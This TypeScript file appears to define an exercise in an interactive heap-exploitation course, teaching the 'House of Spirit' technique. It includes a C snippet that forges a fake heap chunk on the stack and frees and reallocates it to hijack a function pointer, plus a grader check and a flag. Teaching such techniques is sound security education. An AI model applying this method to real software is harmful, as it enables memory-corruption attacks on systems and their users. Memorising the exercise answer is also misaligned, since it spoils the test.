import { Exercise } from '../types';

const ex23HouseSpirit: Exercise = {
  id: 'heap2-23',
  unitId: 'unit5-heap-ii',
  title: '23: House of Spirit',
  desc: 'Instead of overflowing TO a chunk, what if you could create a chunk FROM NOTHING? <strong>House of Spirit</strong> crafts a fake chunk in memory (e.g. on the stack) by writing the right header values. When you call <code>free()</code> on the fake chunk\'s address, the allocator accepts it \u2014 it just trusts the metadata! The next <code>malloc()</code> of that size returns YOUR chosen address.',
  source: {
    c: [
      { text: '#include <stdio.h>', cls: '' },
      { text: '#include <stdlib.h>', cls: '' },
      { text: '', cls: '' },
      { text: 'void win() { printf("FLAG\\n"); }', cls: '' },
      { text: '', cls: '' },
      { text: 'void (**handler)();  // at 0x0804a040', cls: '' },
      { text: '', cls: '' },
      { text: 'int main() {', cls: '' },
      { text: '    char stack_buf[64];', cls: '' },
      { text: '    // Write fake chunk header at stack_buf', cls: 'cmt' },
      { text: '    *(size_t*)(stack_buf+0) = 0;', cls: 'highlight' },
      { text: '    *(size_t*)(stack_buf+4) = 0x19;', cls: 'highlight vuln' },
      { text: '    // 0x19 = 24 | PREV_INUSE', cls: 'cmt' },
      { text: '    // Write next-chunk header for sanity check', cls: 'cmt' },
      { text: '    *(size_t*)(stack_buf+24) = 0;', cls: 'highlight' },
      { text: '    *(size_t*)(stack_buf+28) = 0x19;', cls: 'highlight' },
      { text: '    // free the fake chunk (data starts at +8)', cls: 'cmt' },
      { text: '    free(stack_buf + 8);', cls: 'highlight vuln' },
      { text: '    char *p = malloc(16);', cls: 'highlight' },
      { text: '    // p points to stack_buf + 8!', cls: 'cmt' },
      { text: '    *(void**)p = win;', cls: 'highlight' },
      { text: '    (*handler)();', cls: 'highlight' },
      { text: '    return 0;', cls: '' },
      { text: '}', cls: '' },
    ],
  },
  mode: 'heap-house-spirit',
  vizMode: 'heap',
  heapSize: 512,
  showSymbols: true,
  funcPtrAddr: 0x0804a040,
  check(_, heap, symbols) {
    return heap?.funcPtrs?.handler?.current === symbols.win;
  },
  winTitle: 'FLAG{house_of_spirit}',
  winMsg: 'You created a fake chunk by writing the right header values at the right offsets. The allocator just trusts the metadata \u2014 if the headers look valid, free() accepts it. The next malloc returns YOUR chosen address. This is House of Spirit \u2014 get allocation anywhere by faking the metadata.',
};

export default ex23HouseSpirit;
